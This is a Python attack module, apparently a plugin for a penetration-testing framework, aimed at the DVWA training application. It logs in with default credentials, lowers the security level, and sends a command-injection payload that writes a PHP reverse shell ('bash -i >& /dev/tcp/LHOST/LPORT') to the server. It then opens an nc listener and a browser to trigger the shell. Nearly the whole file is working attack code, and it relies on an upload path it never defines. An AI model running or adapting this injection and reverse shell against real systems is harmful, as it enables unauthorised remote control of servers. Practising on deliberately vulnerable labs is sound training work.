from base_module import BaseModule
from utils import colored
import requests
import subprocess
import webbrowser
import os

class DVWARCE(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dvwa_rce"
        self.description = "DVWA Command Injection to RCE (Parts 1 & 2)"

        self.options = {
            "RHOST": {"value": "192.168.107.129", "required": True, "description": "Target DVWA IP/URL"},
            "RPORT": {"value": "80", "required": True, "description": "Target DVWA port"},
            "LHOST": {"value": "127.0.0.1", "required": True, "description": "Listener IP (your machine)"},
            "LPORT": {"value": "4444", "required": True, "description": "Listener port for reverse shell"},
            "USERNAME": {"value": "admin", "required": True, "description": "DVWA username"},
            "PASSWORD": {"value": "password", "required": True, "description": "DVWA password"},
        }

        self.session = None
        self.logged_in = False

    def run(self):
        self._login()

    def _login(self):
        rhost = self.options["RHOST"]["value"]
        print(colored(f"[*] Logging into {rhost}...", "yellow"))

        self.session = requests.Session()

        login_url = f"http://{rhost}/login.php"
        r_get = self.session.get(login_url)

        token_marker = "name='user_token' value='"
        token_pos = r_get.text.find(token_marker)
        user_token = ""
        if token_pos != -1:
            start = token_pos + len(token_marker)
            end = r_get.text.find("'", start)
            user_token = r_get.text[start:end]

        login_data = {
            "username": self.options["USERNAME"]["value"],
            "password": self.options["PASSWORD"]["value"],
            "user_token": user_token,
            "Login": "Login"
        }
        r_login = self.session.post(login_url, data=login_data, allow_redirects=True)

        if "Logout" in r_login.text:
            print(colored("[+] Login successful", "green"))
        else:
            print(colored("[-] Login failed", "red"))
            return

        sec_url = f"http://{rhost}/security.php"
        self.session.post(sec_url, data={"security": "low", "seclev_submit": "Submit"})

        self.logged_in = True
        print(colored("[+] Security level set to Low", "green"))
        self.show_options()

    def upload_revshell(self):
        rhost = self.options["RHOST"]["value"]
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        rev_content = f'<?php system("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\' 2>&1"); ?>'
        safe_content = rev_content.replace("'", "'\\''")

        cmd = f"echo '{safe_content}' > {self.upload_path}/rev.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"http://{rhost}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        trigger_url = f"http://{rhost}/hackable/uploads/rev.php"

        print(colored("[+] Reverse shell uploaded", "green"))
        print(f"Trigger URL: {trigger_url}")

        # Auto-open new terminal with nc
        listener_cmd = f"nc -lvnp {lport}"
        print(colored(f"[*] Opening listener in new terminal: {listener_cmd}", "yellow"))

        try:
            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", listener_cmd + "; echo '--- Reverse shell active ---'; exec bash"])
        except:
            try:
                subprocess.Popen(["xterm", "-e", listener_cmd])
            except:
                print(colored(f"[-] Could not open terminal. Run manually: {listener_cmd}", "red"))

        webbrowser.open(trigger_url)
        print(colored("Browser opened to trigger the shell.", "green"))